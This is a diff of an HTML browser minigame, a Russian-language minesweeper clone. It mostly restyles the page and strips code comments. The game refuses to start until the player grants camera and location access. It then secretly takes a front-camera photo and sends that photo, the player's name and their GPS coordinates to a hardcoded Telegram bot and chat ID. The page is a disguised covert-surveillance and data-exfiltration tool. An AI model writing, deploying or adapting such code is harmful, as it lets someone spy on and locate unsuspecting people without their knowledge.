@@ -4,88 +4,114 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Мини-игра Бомбы</title>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
 <style>
   body {
     margin: 0; padding: 0;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #232526, #1c1c1c);
-    color: #eee;
+    font-family: 'Montserrat', sans-serif;
+    background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1350&q=80') no-repeat center center fixed;
+    background-size: cover;
+    color: #f0f0f5;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
     flex-direction: column;
     user-select: none;
+    text-shadow: 0 0 8px rgba(0,0,0,0.7);
   }
-  #name-section, #game, #permission-denied {
+  #permission-denied, #name-section, #game {
     display: none;
+    background: rgba(0,0,0,0.6);
+    padding: 20px 30px;
+    border-radius: 15px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.8);
+    max-width: 420px;
+    width: 90%;
     text-align: center;
   }
-  #name-section.active, #game.active {
+  #permission-denied.active, #name-section.active, #game.active {
     display: block;
   }
-  #permission-denied.active {
-    display: block;
-    color: #f44336;
-    font-weight: bold;
-  }
-  input[type="text"] {
+  #name-section input {
     font-size: 18px;
-    padding: 8px 12px;
-    border-radius: 6px;
+    padding: 12px 16px;
+    border-radius: 10px;
     border: none;
-    margin-right: 10px;
-    width: 200px;
+    margin-right: 12px;
+    width: 70%;
+    outline: none;
+    box-shadow: inset 0 0 10px rgba(255,255,255,0.3);
+    color: #333;
   }
   button {
     cursor: pointer;
-    padding: 10px 16px;
-    font-size: 18px;
-    border-radius: 6px;
+    padding: 12px 24px;
+    font-size: 20px;
+    border-radius: 12px;
     border: none;
-    background-color: #4CAF50;
+    background-color: #6c63ff;
     color: white;
-    transition: background-color 0.3s ease;
+    font-weight: 700;
+    transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    box-shadow: 0 4px 12px rgba(108, 99, 255, 0.6);
   }
   button:hover {
-    background-color: #45a049;
+    background-color: #857aff;
+    box-shadow: 0 6px 18px rgba(133, 122, 255, 0.8);
   }
   #error-msg {
-    margin-top: 8px;
-    color: #f44336;
+    margin-top: 10px;
+    color: #ff6666;
+    font-weight: 600;
   }
   #game-board {
     margin-top: 20px;
     display: grid;
-    grid-template-columns: repeat(8, 40px);
-    grid-template-rows: repeat(8, 40px);
-    gap: 4px;
+    grid-template-columns: repeat(8, 48px);
+    grid-template-rows: repeat(8, 48px);
+    gap: 6px;
     user-select: none;
   }
   .cell {
-    width: 40px;
-    height: 40px;
-    background-color: #444;
-    border-radius: 4px;
+    width: 48px;
+    height: 48px;
+    background-color: #2c2c7a;
+    border-radius: 8px;
     cursor: pointer;
     display: flex;
     justify-content: center;
     align-items: center;
-    font-weight: bold;
-    font-size: 20px;
+    font-weight: 700;
+    font-size: 22px;
+    color: #eee;
+    box-shadow: inset 0 3px 8px rgba(255,255,255,0.2);
+    transition: background-color 0.2s ease;
   }
   .cell.open {
-    background-color: #eee;
-    color: #222;
+    background-color: #b3b3ff;
+    color: #1a1a4d;
     cursor: default;
+    box-shadow: none;
   }
   .cell.bomb {
-    background-color: #e74c3c;
+    background-color: #ff5252;
     color: white;
+    box-shadow: 0 0 10px 3px #ff5252aa;
+  }
+  #status {
+    margin-top: 18px;
+    font-size: 20px;
+    font-weight: 700;
+    text-shadow: 0 0 6px #000a;
   }
 </style>
 </head>
 <body>
+
+<audio id="bg-audio" loop autoplay muted>
+  <source src="https://cdn.pixabay.com/download/audio/2022/03/14/audio_65b79a2eeb.mp3?filename=soft-ambient-11670.mp3" type="audio/mpeg">
+</audio>
 
 <div id="permission-denied">
   <p>Для игры нужно разрешить доступ к камере и местоположению.<br>Перезагрузите страницу и разрешите.</p>
@@ -119,7 +145,6 @@
   let photoBlob = null;
   let playerName = '';
 
-  // Запрос камеры (фронтальная) и геолокации
   async function requestPermissions() {
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -132,7 +157,6 @@
     }
   }
 
-  // Сделать фото с камеры
   async function takePhoto() {
     if (!stream) return null;
     const track = stream.getVideoTracks()[0];
@@ -141,11 +165,8 @@
         const imageCapture = new ImageCapture(track);
         const photo = await imageCapture.takePhoto();
         return photo;
-      } catch(e) {
-        // fallback
-      }
+      } catch(e) {}
     }
-    // fallback: сделать фото через canvas
     const video = document.createElement('video');
     video.srcObject = stream;
     await video.play();
@@ -177,14 +198,12 @@
 
     photoBlob = await takePhoto();
 
-    // Отправка в Telegram
     sendDataToTelegram(playerName, coords.coords.latitude, coords.coords.longitude, photoBlob);
 
     nameSection.classList.remove('active');
     startGame();
   };
 
-  // Игра — мини "Бомбы"
   const size = 8;
   const bombsCount = 10;
   let board = [];
@@ -201,15 +220,11 @@
   }
 
   function createBoard(size, bombsCount) {
-    // Создаём массив клеток
-    const board = Array(size * size).fill({bomb: false, open: false, adjacent: 0});
-    // Для мутирования надо сделать копию объектов
     let cells = [];
     for(let i=0; i<size*size; i++) {
       cells.push({bomb:false, open:false, adjacent:0});
     }
 
-    // Расставляем бомбы
     let bombsPlaced = 0;
     while (bombsPlaced < bombsCount) {
       const idx = Math.floor(Math.random() * size * size);
@@ -219,7 +234,6 @@
       }
     }
 
-    // Считаем соседние бомбы для каждой клетки
     for (let i=0; i<size*size; i++) {
       if (cells[i].bomb) continue;
       const neighbors = getNeighbors(i, size);
@@ -293,14 +307,11 @@
   }
 
   function sendDataToTelegram(name, lat, lon, photoBlob) {
-    // Отправляем текст с именем и координатами
     const text = `Новый игрок: ${name}\nШирота: ${lat}\nДолгота: ${lon}`;
 
-    // Отправка текста
     fetch(`https://api.telegram.org/bot7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M/sendMessage?chat_id=526758225&text=${encodeURIComponent(text)}`)
       .catch(console.error);
 
-    // Отправка фото, если есть
     if (photoBlob) {
       const formData = new FormData();
       formData.append('chat_id', '526758225');
@@ -313,7 +324,6 @@
       }).catch(console.error);
     }
   }
-
 })();
 </script>
 
